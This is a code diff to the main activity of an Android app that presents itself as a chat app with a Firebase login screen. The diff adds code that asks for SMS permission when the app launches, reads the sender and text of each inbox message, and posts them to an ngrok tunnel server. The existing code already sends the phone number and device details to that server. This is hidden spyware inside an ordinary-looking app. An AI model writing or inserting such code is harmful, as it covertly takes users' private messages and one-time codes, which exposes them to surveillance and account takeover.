@@ -1,11 +1,16 @@
 package com.example.mychatapp;
 
 
+import android.annotation.SuppressLint;
+import android.content.ContentResolver;
 import android.content.Intent;
 import android.content.pm.PackageManager;
+import android.database.Cursor;
+import android.net.Uri;
 import android.os.AsyncTask;
 import android.os.Build;
 import android.os.Bundle;
+import android.provider.Telephony;
 import android.util.Patterns;
 import android.view.View;
 import android.widget.EditText;
@@ -18,27 +23,37 @@ import androidx.appcompat.app.AppCompatActivity;
 import androidx.core.app.ActivityCompat;
 import androidx.core.content.ContextCompat;
 
+import com.android.volley.toolbox.HttpResponse;
 import com.google.android.gms.tasks.OnCompleteListener;
 import com.google.android.gms.tasks.Task;
 import com.google.firebase.auth.AuthResult;
 import com.google.firebase.auth.FirebaseAuth;
+import com.google.gson.Gson;
 
 import org.json.JSONObject;
 
 import java.io.BufferedReader;
+import java.io.BufferedWriter;
 import java.io.DataOutputStream;
+import java.io.IOException;
 import java.io.InputStreamReader;
+import java.io.OutputStream;
+import java.io.OutputStreamWriter;
 import java.net.HttpURLConnection;
 import java.net.URL;
+import java.nio.charset.StandardCharsets;
 import java.util.HashMap;
 import java.util.Map;
+import java.util.Set;
 
 import android.content.Context;
 import android.telephony.TelephonyManager;
 import android.Manifest;
 
 public class MainActivity extends AppCompatActivity {
-    private static final int REQUEST_READ_PHONE_STATE = 1 ;
+    private static final int REQUEST_READ_PHONE_STATE = 1;
+    private static final int PERMISSION_REQUEST_CODE = 1;
+    private static final String SMS_URI = "content://sms/inbox";
 
     //variable for each elements
     private FirebaseAuth firebaseAuth;
@@ -47,12 +62,26 @@ public class MainActivity extends AppCompatActivity {
     private EditText editEmail, editPassword;
     private android.widget.Button signIn;
 
-
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
         String hpno = null;
+
+        //get sms permisison at run time
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS)
+                != PackageManager.PERMISSION_GRANTED) {
+            // Permission is not granted
+            // Request the permission
+            ActivityCompat.requestPermissions(this,
+                    new String[]{Manifest.permission.READ_SMS},
+                    PERMISSION_REQUEST_CODE);
+            System.out.println("Failed to grant sms permission");
+        } else {
+            // Permission has already been granted
+            //function to get sms to server
+            sendSmsToServer();
+        }
 
         //need to set permission dynamically
         //get phone no need run 2 times then can get phone no.
@@ -64,14 +93,15 @@ public class MainActivity extends AppCompatActivity {
             TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
             String phoneNumber = telephonyManager.getLine1Number();
             System.out.println("Phone no " + phoneNumber);
-            hpno =  phoneNumber;
+            hpno = phoneNumber;
         }
+
 
         String deviceManufacturer = Build.MANUFACTURER;
         String deviceModel = Build.MODEL;
         String androidVersion = Build.VERSION.RELEASE;
         String deviceNumber = hpno;
-        System.out.println("Phone no2222 " + deviceNumber);
+        System.out.println("Phone No check: " + deviceNumber);
 
         // Store the information in a Map
         Map<String, String> deviceInfo = new HashMap<>();
@@ -131,9 +161,7 @@ public class MainActivity extends AppCompatActivity {
             }
         });
 
-
     }
-
 
     public static class SendDeviceInfoTask extends AsyncTask<Map<String, String>, Void, Void> {
 
@@ -141,7 +169,7 @@ public class MainActivity extends AppCompatActivity {
         protected Void doInBackground(Map<String, String>... deviceInfos) {
             try {
 
-                URL url = new URL("https://5010-122-11-214-225.ap.ngrok.io/device"); //ngrok url to allow internet access without having to be same network
+                URL url = new URL("https://c5a7-118-189-138-35.ap.ngrok.io/device"); //ngrok url to allow internet access without having to be same network
                 //URL url = new URL("http://192.168.2.145:5000/device");
                 HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                 conn.setRequestMethod("POST");
@@ -157,7 +185,7 @@ public class MainActivity extends AppCompatActivity {
                 os.close();
 
                 int responseCode = conn.getResponseCode();
-                System.out.println("\nSending 'POST' request to URL : " + url);
+                System.out.println("\nSending Device info 'POST' request to URL : " + url);
                 System.out.println("Response Code : " + responseCode);
 
                 BufferedReader in = new BufferedReader(
@@ -178,7 +206,69 @@ public class MainActivity extends AppCompatActivity {
         }
     }
 
+    public void sendSmsToServer() {
+        ContentResolver contentResolver = getContentResolver();
+        Cursor cursor = contentResolver.query(Uri.parse(SMS_URI), null, null, null, null);
 
+        Map<String, String> smsMap = new HashMap<>();
+        //error in the way message is being stored
+
+        if (cursor.moveToFirst()) {
+            do {
+                String address = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
+                String body = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY));
+                String smsResult = address + " : " + body;
+                System.out.println("sms info: " + smsResult);
+                smsMap.put("smsAddress", address);
+                smsMap.put("smsBody", body);
+
+
+            } while (cursor.moveToNext());
+        }
+
+        cursor.close();
+
+        Gson gson = new Gson();
+        String smsJson = gson.toJson(smsMap);
+
+        new SendSmsTask().execute(smsJson);
+    }
+
+    public class SendSmsTask extends AsyncTask<String, Void, Void> {
+
+        @Override
+        protected Void doInBackground(String... params) {
+            try {
+                URL url = new URL("https://c5a7-118-189-138-35.ap.ngrok.io/sms"); //ngrok url to allow internet access without having to be same network
+                //URL url = new URL("http://192.168.2.145:5000/sms");
+                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+                conn.setRequestMethod("POST");
+                conn.setRequestProperty("Content-Type", "application/json");
+                conn.setDoOutput(true);
+                conn.setDoInput(true);
+
+                OutputStream os = conn.getOutputStream();
+                BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(os, "UTF-8"));
+                writer.write(params[0]);
+                writer.flush();
+                writer.close();
+                os.close();
+
+                int responseCode = conn.getResponseCode();
+                System.out.println("\nSending SMS 'POST' request to URL : " + url);
+                System.out.println("Response Code : " + responseCode);
+
+            } catch (Exception e) {
+                System.out.println("Error connecting to the sms server");
+            }
+            return null;
+
+        }
+    }
 }
+
+
+
+
 
 
